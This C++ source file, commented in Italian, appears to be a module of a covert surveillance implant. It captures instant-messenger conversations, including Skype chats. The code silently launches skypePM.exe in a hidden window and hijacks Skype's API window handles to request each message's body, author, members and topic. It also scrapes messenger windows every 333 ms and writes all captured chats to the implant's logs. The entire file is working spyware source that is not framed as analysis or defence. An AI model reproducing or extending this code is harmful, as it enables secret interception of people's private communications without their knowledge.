#include "HM_IMAgent\QMessengerAgent.h"

extern WCHAR *UTF8_2_UTF16(char *str); // in firefox.cpp

#define IM_CAPTURE_INTERVAL 333 // in millisecondi

BOOL bPM_IMStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
BOOL bPM_imcp = FALSE; // Semaforo per l'uscita del thread
HANDLE hIMThread = NULL;

BOOL bPM_imspmcp = FALSE; // Semaforo per l'uscita del thread
HANDLE hIMSkypePMThread = NULL;

#define SKYPE_MESSAGE_BACKLOG 1500
typedef struct im_skype_message_struct {
	BOOL in_use;
	DWORD direction;
#define SKYPE_MSG_OUT 2
#define SKYPE_MSG_IN 1
#define SKYPE_MSG_NO 0
	char *message_id;
	// I seguenti sono in UTF8
	char *author;
	char *peers;
	char *topic;
	char *body;
} im_skype_message_entry;
im_skype_message_entry *im_skype_message_list = NULL;

// Monitora costantemente la presenza di SkypePM
DWORD WINAPI IMMonitorSkypePM(DWORD dummy)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	DWORD skipe_id;
	HANDLE skype_handle;
	char skype_path[MAX_PATH];
	char *skype_pm_ptr;
	char skype_pm_path[MAX_PATH];

	LOOP {
		// SkypePM ci serve per tenere traccia del flusso delle chiamate
		if (!HM_FindPid("skypePM.exe", TRUE) && !IsX64System()) {			
			ZeroMemory( &si, sizeof(si) );
			si.cb = sizeof(si);
			si.wShowWindow = SW_HIDE;
			si.dwFlags = STARTF_USESHOWWINDOW;

			// Cerca il path di skypepm partendo da quello di skype.exe
			// e lo esegue
			if ( (skipe_id = HM_FindPid("skype.exe", TRUE)) ) {
				if ( (skype_handle = FNC(OpenProcess)(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, skipe_id)) ) {
					if (FNC(GetModuleFileNameExA)(skype_handle, NULL, skype_path, sizeof(skype_path)-1)) {
						if (skype_pm_ptr = strstr(skype_path, "\\Phone\\")) {
							*skype_pm_ptr = 0;
							_snprintf_s(skype_pm_path, sizeof(skype_pm_path), _TRUNCATE, "%s\\Plugin Manager\\skypePM.exe", skype_path);		
							HM_CreateProcess(skype_pm_path, 0, &si, &pi, 0);
						}
					}
					CloseHandle(skype_handle);
				}
			}
		}

		for (DWORD i=0; i<6; i++) {
			CANCELLATION_POINT(bPM_imspmcp);
			Sleep(250);
		}
	}
	return 0;
}


// Logga il contenuto delle finestre di IM
void GetIM(QMessengerAgent *ma, BOOL bDontLog)
{
	PWCHAR wHistory;
	UINT i;

	ma->UpdateWindowList();
	for(i = 0; i < ma->GetListLength(); i++, ma->Next()){	
		if(ma->IsUpdated()){
			if ( (wHistory = ma->GetHistory()) == NULL )
				continue;

			bin_buf tolog;
			struct tm tstamp;
			DWORD delimiter = ELEM_DELIMITER;
			GET_TIME(tstamp);

			if(!bDontLog){
				tolog.add(&tstamp, sizeof(tstamp));
				tolog.add(ma->GetMessengerName(), (wcslen(ma->GetMessengerName())+1)*sizeof(WCHAR));
				tolog.add(ma->GetTopic(), (wcslen(ma->GetTopic())+1)*sizeof(WCHAR));
				tolog.add(ma->GetUsers(), (wcslen(ma->GetUsers())+1)*sizeof(WCHAR));
				tolog.add(wHistory, (wcslen(wHistory)+1)*sizeof(WCHAR));
				tolog.add(&delimiter, sizeof(DWORD));
				LOG_ReportLog(PM_IMAGENT, tolog.get_buf(), tolog.get_len());
			}

			ma->ChatAcquired();
		}
	}
}

void SEHTranslatorFunction(UINT code, struct _EXCEPTION_POINTERS *)
{
	throw(0);
}

DWORD WINAPI IMCaptureThread(DWORD dummy)
{
	QMessengerAgent ma;
	BOOL bLog = TRUE;

	_set_se_translator(SEHTranslatorFunction);

	LOOP {
		try {
			GetIM(&ma, bLog);
		} catch(int) {}

		for (int i=0; i<3; i++) {
			RET_CANCELLATION_POINT(bPM_imcp);
			Sleep(IM_CAPTURE_INTERVAL); 
		}
		RET_CANCELLATION_POINT(bPM_imcp);

		bLog = FALSE;
	}
}

void FreeSkypeMessageEntry(im_skype_message_entry *skentry)
{
	SAFE_FREE(skentry->body);
	SAFE_FREE(skentry->message_id);
	SAFE_FREE(skentry->peers);
	SAFE_FREE(skentry->author);
	SAFE_FREE(skentry->topic);
	skentry->in_use = FALSE;
}

BOOL CheckCompleteEntry(im_skype_message_entry *skentry)
{
	if (skentry->body && skentry->peers && skentry->topic && skentry->author)
		return TRUE;
	return FALSE;
}

void FreeSkypeMessageList(im_skype_message_entry *skarray)
{
	DWORD i;
	for (i=0; i<SKYPE_MESSAGE_BACKLOG; i++)
		FreeSkypeMessageEntry(skarray + i);
	ZeroMemory(skarray, sizeof(im_skype_message_entry)*SKYPE_MESSAGE_BACKLOG);
}

char *GetMessageBody(char *msg, DWORD direction)
{
	char *ptr = NULL, *parser;

	if ( ptr = strstr(msg, " BODY ") )  {
		ptr += strlen(" BODY ");
		// Toglie il timestamp
		if (direction == SKYPE_MSG_IN && (parser = strchr(ptr, ':')) && (parser = strchr(parser+1, ':')))
			if (parser[1] && parser[2] && parser[3])
				ptr = parser + 4;
	}

	return ptr;
}

char *GetMessageTopic(char *msg)
{
	char *ptr = NULL;
	if ( ptr = strstr(msg, " TOPIC ") ) 
		ptr += strlen(" TOPIC ");
	return ptr;
}

char *GetMessagePeers(char *msg)
{
	char *ptr = NULL;
	if ( ptr = strstr(msg, " MEMBERS ") ) 
		ptr += strlen(" MEMBERS ");
	return ptr;
}

char *GetMessageAuthor(char *msg)
{
	char *ptr = NULL;
	if ( ptr = strstr(msg, " FROM_HANDLE ") ) 
		ptr += strlen(" FROM_HANDLE ");
	return ptr;
}

void GetMessageID(char *msg, char *id, DWORD size)
{
	char *ptr;
	ptr = (char *)msg + strlen("#IMAGX");
	_snprintf_s(id, size, _TRUNCATE, "%s", ptr);					
	if (ptr = strchr(id, ' '))
		*ptr = 0;
}

char *GetChatName(char *msg)
{
	char *ptr = NULL;
	if (ptr = strstr(msg, " CHATNAME ")) 
		ptr += strlen(" CHATNAME ");
	return ptr;
}

void SkypeLogMessageEntry(im_skype_message_entry *skentry)
{
	bin_buf tolog;
	struct tm tstamp;
	WCHAR *topic, *peers, *body, *author;
	DWORD delimiter = ELEM_DELIMITER;
	GET_TIME(tstamp);

	// logga il messaggio solo se ha un body
	if (!skentry->body[0])
		return;
	
	topic = UTF8_2_UTF16(skentry->topic);
	peers = UTF8_2_UTF16(skentry->peers);
	body = UTF8_2_UTF16(skentry->body);
	author = UTF8_2_UTF16(skentry->author);

	if (topic && peers && body && author) {
		tolog.add(&tstamp, sizeof(tstamp));
		tolog.add(L"SKYPE", (wcslen(L"SKYPE")+1)*sizeof(WCHAR));
		tolog.add(topic, (wcslen(topic)+1)*sizeof(WCHAR));
		tolog.add(peers, (wcslen(peers)+1)*sizeof(WCHAR));
		tolog.add(author, wcslen(author)*sizeof(WCHAR));
		tolog.add(L": ", wcslen(L": ")*sizeof(WCHAR));
		tolog.add(body, (wcslen(body)+1)*sizeof(WCHAR));
		tolog.add(&delimiter, sizeof(DWORD));
		LOG_ReportLog(PM_IMAGENT_SKYPE, tolog.get_buf(), tolog.get_len());
	}
	SAFE_FREE(topic);
	SAFE_FREE(peers);
	SAFE_FREE(body);
	SAFE_FREE(author);
}

DWORD __stdcall PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *time_nanosec)
{
	static HWND im_skype_api_wnd = NULL;
	static HWND im_skype_pm_wnd = NULL;
	DWORD i, dummy;
	COPYDATASTRUCT cd_struct;
	char req_buf[512];

	// Se il monitor e' stoppato o i parametri non vanno bene, non esegue la funzione di dispatch
	if (!bPM_IMStarted || !msg || !im_skype_message_list)
		return 0;

	if (dwFlags == FLAGS_SKAPI_INI) {
		// Azzera tutta la lista (mettendo anche a FALSE tutti i flag in_use)
		FreeSkypeMessageList(im_skype_message_list);
		return 1;
	}
	if (dwFlags == FLAGS_SKAPI_WND) {
		REPORT_STATUS_LOG("- Monitoring IM queues.............OK\r\n");
		im_skype_api_wnd = *((HWND *)msg);
		return 1;
	}
	if (dwFlags == FLAGS_SKAPI_SWD) {
		im_skype_pm_wnd = *((HWND *)msg);
		return 1;
	}

	// Per proseguire devo aver gia' intercettato le finestre
	if (!im_skype_api_wnd || !im_skype_pm_wnd)
		return 0;
	if (dwFlags == FLAGS_SKAPI_MSG) {
		NullTerminatePacket(dwLen, msg);
		// Se e' una notifica di messaggio...
		if (!strncmp((char *)msg, "CHATMESSAGE ", strlen("CHATMESSAGE "))) {
			DWORD direction;
			char *msg_ptr, *message_id;
		
			if (msg_ptr = strstr((char *)msg, " STATUS SENT")) {
				direction = SKYPE_MSG_OUT;
				*msg_ptr = 0;
			} else if (msg_ptr = strstr((char *)msg, " STATUS READ")) {
				direction = SKYPE_MSG_IN;
				*msg_ptr = 0;
			} else
				return 0;
			message_id = (char *)msg + strlen("CHATMESSAGE ");

			// Verifica che non ci sia gia' questo messaggio in lista
			for (i=0; i<SKYPE_MESSAGE_BACKLOG; i++) {
				if (im_skype_message_list[i].in_use && !strcmp(im_skype_message_list[i].message_id, message_id)) {
					// Se lo stiamo gia' parsando ritorna...
					return 0;
				}
			}

			// ora abbiamo direzione e MSG_ID.
			// Cerchiamo un posto libero nell'array 
			for (i=0; i<SKYPE_MESSAGE_BACKLOG; i++) {
				if (!im_skype_message_list[i].in_use) {
					if ( im_skype_message_list[i].message_id = strdup(message_id) ) {
						im_skype_message_list[i].direction = direction;
						im_skype_message_list[i].in_use = TRUE;
						break;
					}
				}
			}
			// Se per errori precedenti la lista e' piena, la libera
			if (i == SKYPE_MESSAGE_BACKLOG) {
				FreeSkypeMessageList(im_skype_message_list);
				return 0;
			}

			// E spediamo i messaggi di richiesta di informazioni
			_snprintf_s(req_buf, sizeof(req_buf), _TRUNCATE, "#IMAGN%s GET CHATMESSAGE %s CHATNAME", message_id, message_id);		
			cd_struct.dwData = 0;
			cd_struct.lpData = req_buf;
			cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
			HM_SafeSendMessageTimeoutW(im_skype_api_wnd, WM_COPYDATA, (WPARAM)im_skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
			
			_snprintf_s(req_buf, sizeof(req_buf), _TRUNCATE, "#IMAGB%s GET CHATMESSAGE %s BODY", message_id, message_id);		
			cd_struct.dwData = 0;
			cd_struct.lpData = req_buf;
			cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
			HM_SafeSendMessageTimeoutW(im_skype_api_wnd, WM_COPYDATA, (WPARAM)im_skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);

			_snprintf_s(req_buf, sizeof(req_buf), _TRUNCATE, "#IMAGA%s GET CHATMESSAGE %s FROM_HANDLE", message_id, message_id);		
			cd_struct.dwData = 0;
			cd_struct.lpData = req_buf;
			cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
			HM_SafeSendMessageTimeoutW(im_skype_api_wnd, WM_COPYDATA, (WPARAM)im_skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);

			return 1;
		} else if (!strncmp((char *)msg, "#IMAGB", strlen("#IMAGB")) || 
			       !strncmp((char *)msg, "#IMAGT", strlen("#IMAGT")) ||
				   !strncmp((char *)msg, "#IMAGA", strlen("#IMAGA")) ||
				   !strncmp((char *)msg, "#IMAGM", strlen("#IMAGM"))) {
			// Se e' il body, il topic, l'autore o i peer
			char message_id[128], *data = NULL, **prop_to_write = NULL;
			GetMessageID((char *)msg, message_id, sizeof(message_id));
				
			// Cerca il messaggio fra quelli in lista...
			for (i=0; i<SKYPE_MESSAGE_BACKLOG; i++) {
				// Se e' in use ha sicuramente il message_id valorizzato
				if (im_skype_message_list[i].in_use && !strcmp(im_skype_message_list[i].message_id, message_id)) {

					// Vede che tipo di dato abbiamo recuperato
					if (!strncmp((char *)msg, "#IMAGB", strlen("#IMAGB"))) {
						data = GetMessageBody((char *)msg, im_skype_message_list[i].direction);
						prop_to_write = &(im_skype_message_list[i].body);
					} else if (!strncmp((char *)msg, "#IMAGT", strlen("#IMAGT"))) {
						data = GetMessageTopic((char *)msg);
						prop_to_write = &(im_skype_message_list[i].topic);
					} else if (!strncmp((char *)msg, "#IMAGM", strlen("#IMAGM"))) {
						data = GetMessagePeers((char *)msg);
						prop_to_write = &(im_skype_message_list[i].peers);
					} else if (!strncmp((char *)msg, "#IMAGA", strlen("#IMAGA"))) {
						data = GetMessageAuthor((char *)msg);
						prop_to_write = &(im_skype_message_list[i].author);
					}  

					if ((*prop_to_write))
						break;

					// Ci aggiunge il dato
					if (data && ((*prop_to_write) = strdup(data))) {
						// Se con questo completa la entry, la logga e la libera
						if (CheckCompleteEntry(&im_skype_message_list[i])) {
							SkypeLogMessageEntry(&im_skype_message_list[i]);
							FreeSkypeMessageEntry(&im_skype_message_list[i]);
						} 
					} else // Se fallisce, libera tutta la entry
						FreeSkypeMessageEntry(&im_skype_message_list[i]);
					break;
				}
			}
			return 1;
		} else if (!strncmp((char *)msg, "#IMAGN", strlen("#IMAGN"))) {
			// Ha trovato il nome dalla chat
			char message_id[128], *chat_name;
			GetMessageID((char *)msg, message_id, sizeof(message_id));
			if (chat_name = GetChatName((char *)msg)) {
				// E spediamo i messaggi di richiesta di informazioni
				_snprintf_s(req_buf, sizeof(req_buf), _TRUNCATE, "#IMAGM%s GET CHAT %s MEMBERS", message_id, chat_name);		
				cd_struct.dwData = 0;
				cd_struct.lpData = req_buf;
				cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
				HM_SafeSendMessageTimeoutW(im_skype_api_wnd, WM_COPYDATA, (WPARAM)im_skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
				
				_snprintf_s(req_buf, sizeof(req_buf), _TRUNCATE, "#IMAGT%s GET CHAT %s TOPIC", message_id, chat_name);		
				cd_struct.dwData = 0;
				cd_struct.lpData = req_buf;
				cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
				HM_SafeSendMessageTimeoutW(im_skype_api_wnd, WM_COPYDATA, (WPARAM)im_skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
			}
			return 1;
		}
	}

	return 1;
}


DWORD __stdcall PM_IMStartStop(BOOL bStartFlag, BOOL bReset)
{
	DWORD dummy;

	if (bReset)
		AM_IPCAgentStartStop(PM_IMAGENT_SKYPE, bStartFlag);

	// Se l'agent e' gia' nella condizione desiderata
	// non fa nulla.
	if (bPM_IMStarted == bStartFlag)
		return 0;

	bPM_IMStarted = bStartFlag;

	if (bStartFlag) {
		LOG_InitAgentLog(PM_IMAGENT);
		LOG_InitAgentLog(PM_IMAGENT_SKYPE);

		// Crea il thread che esegue gli IM
		hIMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)IMCaptureThread, NULL, 0, &dummy);
		// Crea il thread che monitora skypepm
		hIMSkypePMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)IMMonitorSkypePM, NULL, 0, &dummy);
	} else {
		// All'inizio non si stoppa perche' l'agent e' gia' nella condizione
		// stoppata (bPM_IMStarted = bStartFlag = FALSE)
		QUERY_CANCELLATION(hIMThread, bPM_imcp);
		// e stoppiamo il thread che monitora lo skypePM
		QUERY_CANCELLATION(hIMSkypePMThread, bPM_imspmcp);
		
		// chiude il logging (come ultima cosa)
		LOG_StopAgentLog(PM_IMAGENT);
		LOG_StopAgentLog(PM_IMAGENT_SKYPE);
	}

	return 1;
}


DWORD __stdcall PM_IMInit(BYTE *conf_ptr, BOOL bStartFlag)
{
	if (!im_skype_message_list)
		im_skype_message_list = (im_skype_message_entry *)calloc(SKYPE_MESSAGE_BACKLOG, sizeof(im_skype_message_entry));
	PM_IMStartStop(bStartFlag, TRUE);
	return 1;
}


void PM_IMRegister()
{
	AM_MonitorRegister(PM_IMAGENT, (BYTE *)PM_IMDispatch, (BYTE *)PM_IMStartStop, (BYTE *)PM_IMInit, NULL);

	// Inizialmente i monitor devono avere una configurazione di default nel caso
	// non siano referenziati nel file di configurazione (partono comunque come stoppati).
	PM_IMInit(NULL, FALSE);
}